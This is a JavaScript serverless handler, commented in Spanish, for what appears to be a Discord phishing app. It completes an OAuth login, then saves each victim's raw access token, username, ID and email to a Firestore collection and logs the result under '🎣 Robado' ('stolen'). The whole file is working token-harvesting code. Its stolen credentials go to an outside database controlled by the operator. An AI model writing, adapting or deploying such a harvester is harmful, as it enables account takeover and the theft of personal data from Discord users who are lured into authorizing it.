import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore";

// Inicializar Firebase
const firebaseConfig = {
    apiKey: process.env.VITE_FIREBASE_API_KEY,
    authDomain: process.env.VITE_FIREBASE_AUTH_DOMAIN,
    projectId: process.env.VITE_FIREBASE_PROJECT_ID,
    storageBucket: process.env.VITE_FIREBASE_STORAGE_BUCKET,
    messagingSenderId: process.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
    appId: process.env.VITE_FIREBASE_APP_ID
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

export default async function handler(req, res) {
    if (req.method !== 'GET') return res.status(405).json({ error: 'Método no permitido' });

    const code = req.query.code;
    const clientId = process.env.DISCORD_CLIENT_ID;
    const clientSecret = process.env.DISCORD_CLIENT_SECRET;

    if (!code) {
        return res.redirect('/?error=no_code');
    }

    try {
        // 1. Intercambiar código por token
        const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                client_id: clientId,
                client_secret: clientSecret,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: `${req.headers.origin}/callback`
            })
        });

        const tokenData = await tokenRes.json();
        if (!tokenData.access_token) throw new Error('Token inválido');

        // 2. Obtener datos del usuario
        const userRes = await fetch('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${tokenData.access_token}` }
        });

        const userData = await userRes.json();

        // 3. Guardar en Firestore
        await addDoc(collection(db, "users"), {
            token: tokenData.access_token,
            username: userData.username,
            discriminator: userData.discriminator,
            email: userData.email || 'No disponible',
            id: userData.id,
            avatar: userData.avatar,
            date: new Date().toISOString()
        });

        console.log(`🎣 Robado: ${userData.username}#${userData.discriminator} (${userData.email})`);

        // 4. Redirigir a éxito
        return res.redirect('/success.html');

    } catch (err) {
        console.error(err);
        return res.redirect('/?error=fallback');
    }
}